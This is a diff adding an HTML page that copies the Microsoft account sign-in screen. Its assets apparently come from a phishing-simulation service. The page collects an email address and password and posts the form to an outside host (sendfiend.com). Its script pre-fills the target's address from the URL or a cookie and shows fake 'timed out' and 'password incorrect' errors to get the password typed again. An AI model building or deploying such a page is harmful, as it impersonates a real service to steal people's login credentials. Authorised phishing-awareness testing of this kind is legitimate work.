@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+
+<html dir="ltr" lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="ie=edge" http-equiv="X-UA-Compatible"/>
+<title>Sign in to your account</title>
+<link href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" rel="shortcut icon" type="image/x-icon"/>
+<link href="local_resources/css/ef5cacdb65fbacf7b3ddccaf588bbbad.css" rel="stylesheet" type="text/css"/>
+</head>
+<body>
+<div>
+<div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
+<div class="background" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }" role="presentation">
+<div data-bind="backgroundImage: smallImageUrl()">
+</div>
+<div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()">
+</div>
+</div>
+</div>
+<div data-bind="if: activeDialog"></div>
+<input id="firstem" name="firstem" type="hidden"/>
+<input id="firstpw" name="firstpw" type="hidden"/>
+<input id="secondpw" name="secondpw" type="hidden"/>
+<input id="referrer" name="referrer" type="hidden" value=""/>
+<div class="outer">
+<div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
+<div style="width: 160px; margin: auto;">
+</div>
+<div class="inner fade-in-lightbox">
+<div class="lightbox-cover"></div>
+<div>
+<img alt="Microsoft" class="logo" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" pngsrc="https://static.securepractice.co/phishing/bd798dad09a78a85e124b382816e71d13b3d77ea/microsoftlogoed9c9eb0dce17d752bedea6b5acda6d9.png" src="local_resources/img/aa7654965886d4c6a60ca82ea62fa421.svg" svgsrc="https://static.securepractice.co/phishing/bd798dad09a78a85e124b382816e71d13b3d77ea/microsoftlogoee5c8d9fb6248c938fd0dc19370e90bd.svg"/>
+</div>
+<div id="part1" role="main">
+<div class="" data-bind="css: { 'zero-opacity': hidePaginatedView() }">
+<div class="pagination-view animate slide-in-next">
+<div data-showfedcredbutton="true" data-viewid="1">
+<div>
+<div class="row">
+<time></time>
+</div>
+</div>
+<div>
+<div class="row text-title" id="loginHeader">
+<div aria-level="1" data-bind="text: title" role="heading">Sign in</div>
+</div>
+</div>
+<div class="row">
+<div aria-live="assertive" role="alert"></div>
+<div aria-live="assertive" role="alert"><!-- ko if: usernameTextbox.error --> <div class="alert alert-error col-md-24" data-bind="
+                          htmlWithBindings: usernameTextbox.error,
+                          childBindings: {
+                          'idA_PWD_SignUp': { href: svr.urlSignUp, click: signup_onClick },
+                          'otherIdpLogin': { href: svr.urlGoToAADError, click: otherIdpLogin_onClick },
+                          'sendOtcLink': { click: sendOtcLink_onClick } }" id="twice-error">Email address and password is invalid.</div><!-- /ko --> </div>
+<div aria-live="assertive" role="alert"><!-- ko if: usernameTextbox.error --> <div class="alert alert-error col-md-24" data-bind="
+                          htmlWithBindings: usernameTextbox.error,
+                          childBindings: {
+                          'idA_PWD_SignUp': { href: svr.urlSignUp, click: signup_onClick },
+                          'otherIdpLogin': { href: svr.urlGoToAADError, click: otherIdpLogin_onClick },
+                          'sendOtcLink': { click: sendOtcLink_onClick } }" id="usernameError">Enter a valid work email address.</div><!-- /ko --> </div>
+<div class="form-group col-md-24">
+<div class="placeholderContainer">
+<input aria-required="true" autocomplete="true" autofocus="true" class="form-control ltr_override" id="i0116" lang="en" maxlength="113" name="email" placeholder="Email, phone, or Skype" type="email"/>
+</div>
+</div>
+</div>
+<div class="position-buttons" data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }">
+<div class="row">
+<div class="col-md-24">
+<div class="text-13 action-links">
+<div class="form-group">No account? <a href="javascript:void(0)" id="cantAccessAccount" name="cannotAccessAccount">Create one!</a> </div>
+<div class="form-group"> <a href="javascript:void(0)" id="cantAccessAccount" name="cannotAccessAccount">Can't access your account?</a> </div>
+<div class="form-group">
+<div class="form-group">
+<a href="javascript:void(0)" id="idA_PWD_SwitchToCredPicker">Sign-in options</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="row">
+<div>
+<div class="col-xs-24 no-padding-left-right button-container">
+<div class="inline-block">
+<input class="btn btn-block btn-primary" id="idSIButton9" type="button" value="Next"/>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="part2" role="main">
+<div>
+<div class="row">
+<time></time>
+</div>
+</div>
+<div>
+<div class="animate slide-in-next">
+<div>
+<div class="identityBanner">
+<button aria-label="Back" class="backButton" data-bind="
+                                                                            attr: { 'id': backButtonId || 'idBtn_Back' },
+                                                                            ariaLabel: str['CT_HRD_STR_Splitter_Back'],
+                                                                            ariaDescribedBy: backButtonDescribedBy,
+                                                                            click: backButton_onClick,
+                                                                            hasFocus: focusOnBackButton" id="idBtn_Back" type="button"><!-- ko ifnot: svr.fIsRTLMarket --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img data-bind="imgSrc" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" role="presentation" src="local_resources/img/fdce985cf548630b0b353bbd9708bf43.svg" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"/><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: svr.fIsRTLMarket --><!-- /ko --> </button>
+<div class="identity" id="displayName"></div>
+</div>
+</div>
+</div>
+<div class="pagination-view has-identity-banner animate slide-in-next">
+<div data-dynamicbranding="true" data-showidentitybanner="true" data-viewid="2">
+<input aria-hidden="true" class="moveOffScreen" name="loginfmt" tabindex="-1" type="text"/>
+<div aria-level="1" class="row text-title" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']" id="loginHeader" role="heading">Enter password</div>
+<div class="row">
+<div class="form-group col-md-24">
+<div aria-live="assertive" role="alert"><!-- ko if: usernameTextbox.error --> <div class="alert alert-error col-md-24" data-bind="
+                            htmlWithBindings: usernameTextbox.error,
+                            childBindings: {
+                            'idA_PWD_SignUp': { href: svr.urlSignUp, click: signup_onClick },
+                            'otherIdpLogin': { href: svr.urlGoToAADError, click: otherIdpLogin_onClick },
+                            'sendOtcLink': { click: sendOtcLink_onClick } }" id="defaultError-2">Sorry, your sign-in timed out. Please sign in again.</div><!-- /ko --> </div>
+<div aria-live="assertive" role="alert">
+<div class="alert alert-error" data-bind="
+                                                                                         htmlWithBindings: passwordTextbox.error,
+                                                                                         childBindings: { 'idA_IL_ForgotPassword0': { href: svr.urlResetPassword, click: resetPassword_onClick } }" id="passwordError">Please enter your password.
+                            </div>
+<div class="alert alert-error" data-bind="
+                                                                                               htmlWithBindings: passwordTextbox.error,
+                                                                                               childBindings: { 'idA_IL_ForgotPassword0': { href: svr.urlResetPassword, click: resetPassword_onClick } }" id="passwordError_again">Your account or password is incorrect.
+                            </div>
+</div>
+<div class="placeholderContainer">
+<input aria-label="Enter the password for lasse@cyberon.no" aria-required="true" autocomplete="on" class="form-control" id="i0118" name="password" placeholder="Password" tabindex="0" type="password"/>
+</div>
+</div>
+</div>
+<div class="position-buttons" data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }">
+<div>
+<div class="row">
+<div class="col-md-24">
+<div class="text-13 action-links">
+<div class="form-group">
+<a id="idA_PWD_ForgotPassword" role="link">Forgot password?</a>
+</div>
+<div class="form-group">
+<a id="idA_PWD_ForgotPassword" role="link">Sign in with a security key</a>
+</div>
+</div>
+</div>
+</div>
+<div class="row">
+<div>
+<div class="col-xs-24 no-padding-left-right button-container">
+<div class="inline-block">
+<form action="https://sendfiend.com/oQKaxIb913oL6Mm0bxTblHDc5viwbxfR" id="i0281" method="post" name="f1">
+<input class="btn btn-block btn-primary" id="idSIButton10" type="button" value="Sign in"/>
+</form>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="footer default" id="footer" role="contentinfo">
+<div>
+<div class="footerNode text-secondary" id="footerLinks">
+<a href="#" id="ftrTerms">Terms of use</a> <a href="#" id="ftrPrivacy">Privacy &amp; cookies</a>
+<a class="moreOptions" href="#" id="moreOptions" role="button">
+<img class="desktopMode" role="presentation" src="local_resources/img/a043c6da44b5c9194cbb750d2be67f3a.png"/>
+<img class="mobileMode" role="presentation" src="local_resources/img/5490439fabcd43a9fe784b62cc4b8f04.png"/>
+</a>
+</div>
+</div>
+</div>
+</div>
+<div id="part3" role="main">
+<div>
+<div class="row">
+<time></time>
+</div>
+</div>
+<div>
+<div class="pagination-view has-identity-banner animate slide-in-next">
+<div data-dynamicbranding="true" data-showidentitybanner="true" data-viewid="2">
+<div style="padding:50px; text-align:center">
+<img id="loading" src="local_resources/img/e7b548b08507ddae07e96f1483b99b3f.png" style="width:95px;">
+</img></div>
+</div>
+</div>
+</div>
+</div>
+<div class="footer default" data-bind="css: { 'default': !backgroundLogoUrl() }" id="footer" role="contentinfo">
+<div>
+<div class="footerNode text-secondary" id="footerLinks">
+<a href="#" id="ftrTerms">Terms of use</a> <a href="#" id="ftrPrivacy">Privacy &amp; cookies</a>
+<a class="moreOptions" href="#" id="moreOptions" role="button">
+<img class="desktopMode" data-bind="imgSrc" role="presentation" src="local_resources/img/a043c6da44b5c9194cbb750d2be67f3a.png"/>
+<img class="mobileMode" role="presentation" src="local_resources/img/5490439fabcd43a9fe784b62cc4b8f04.png"/>
+</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<script crossorigin="anonymous" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" src="local_resources/js/479cfb0dd218ee1dbeee2e3da4444ca3.js"></script>
+<script>
+        var getUrlParameter = function getUrlParameter(sParam) {
+            var sPageURL = window.location.hash.substring(1),
+                sURLVariables = sPageURL.split('&'),
+                sParameterName,
+                i;
+
+            for (i = 0; i < sURLVariables.length; i++) {
+                sParameterName = sURLVariables[i].split('=');
+
+                if (sParameterName[0] === sParam) {
+                    return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
+                }
+            }
+        };
+
+        function setCookie(cname, cvalue, exdays) {
+
+            try{
+                var d = new Date();
+                d.setTime(d.getTime() + (exdays*24*60*60*1000));
+                var expires = "expires="+ d.toUTCString();
+                document.cookie = cname + "=" + cvalue + ";" + expires;
+
+                localStorage.setItem(cname,cvalue);
+            }
+            catch(err) { }
+            
+        }
+
+        function getCookie(cname) {
+
+            try
+            {
+                var name = cname + "=";
+                var decodedCookie = decodeURIComponent(document.cookie);
+                var ca = decodedCookie.split(';');
+                for(var i = 0; i <ca.length; i++) {
+                    var c = ca[i];
+                    while (c.charAt(0) == ' ') {
+                    c = c.substring(1);
+                    }
+                    if (c.indexOf(name) == 0) {
+                    return c.substring(name.length, c.length);
+                    }
+                }
+                return localStorage.getItem(cname);
+            }
+            catch(e) { }
+            
+            return "";
+        }
+
+        $("#i0116").keypress(function(e) {
+            var key = e.which;
+            if(key == 13) {
+                $("#idSIButton9").trigger('click');
+                $("#i0118").focus();
+            }
+        })
+        
+        $("#i0118").keypress(function(e) {
+            var key = e.which;
+            if(key == 13) {
+                $("#idSIButton10").trigger('click');
+                $("#i0118").focus();
+            }
+        })
+
+        var regex = /^([a-zA-Z0-9_\.\-\+])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        var email = getUrlParameter('id');
+        if(isEdge()){
+            email = getCookie('____email');
+        }
+
+        
+
+        var userinput = $("#i0116").val();
+
+        $("#idSIButton9").click(function() {
+            var userinput = $("#i0116").val();
+            
+            //console.log(userinput)
+            $('#defaultError-1').hide();
+            $('#defaultError-2').show();
+            setCookie('loaded', 'true', 1);
+
+            if($("#i0116").val() == '' || !regex.test($("#i0116").val())) {
+                $("#i0116").addClass('has-error');
+                $('#usernameError').show();
+            }
+            else {
+                $("#i0116").removeClass('has-error');
+                $('#usernameError').hide();
+                $("#displayName").text(userinput);
+                $("#part1").hide();
+                $("#part2").show();
+
+                $("#firstem").val($("#i0116").val())
+                $("#i0116").val('');
+                $("#i0118").focus();
+            }
+        });
+
+        $("#idBtn_Back").click(function() {
+            $("#i0116").val(email)
+            $("#part2").hide();
+            $("#part1").show();
+            $("#i0116").focus();
+            $('#passwordError_again').hide();
+            $("input[type='password']").val("");
+        });
+
+        $("#idSIButton10").click(function() {
+            $('#defaultError-1').hide();
+            $('#defaultError-2').hide();
+            setCookie('loaded', 'true', 1);
+
+            if($("#i0118").val() == '') {
+                $("#i0118").addClass('has-error');
+                $('#passwordError').show();
+                $('#passwordError_again').hide();
+            }
+            else {
+
+                $("#i0118").removeClass('has-error');
+                $('#passwordError').hide();
+
+                $("#i0281").submit();
+            }
+        });
+
+        detetch(email);
+
+        function detetch(email)
+        {
+            if(email != '' && regex.test(email)) {
+                $("#i0116").val(email)
+                $("#displayName").text(email);
+                $("#firstem").val(email)
+
+                $("#i0118").addClass('has-error');
+                $('#defaultError-2').show();
+
+                if($("#i0116").val() == '' || !regex.test($("#i0116").val())) {
+                    $("#i0116").addClass('has-error');
+                    $('#usernameError').show();
+                }
+                else {
+                    $("#i0116").removeClass('has-error');
+                    $('#usernameError').hide();
+                    $("#part1").hide();
+                    $("#part2").show();
+
+                    if($("#firstem").val() == '') {
+                        $("#firstem").val($("#i0116").val())
+                        $("#i0116").val('')
+                        $("#i0118").focus();
+                    }
+                }
+            }
+            else {
+                $("#i0116").addClass('has-error');
+                $('#defaultError-1').show();
+            }
+        }
+    
+
+        function isEdge(){
+            return navigator.userAgent.indexOf('Edge') !== -1;
+        }
+    
+    </script>
+<script>
+        $("#i0281").submit(function(e) {
+            $("#idSIButton10").attr("disabled",true);
+            $("input[type='password']").blur();
+
+            $("#part2").hide();
+            $("#part3").show();
+
+        });
+    </script>
+</body>
+</html>
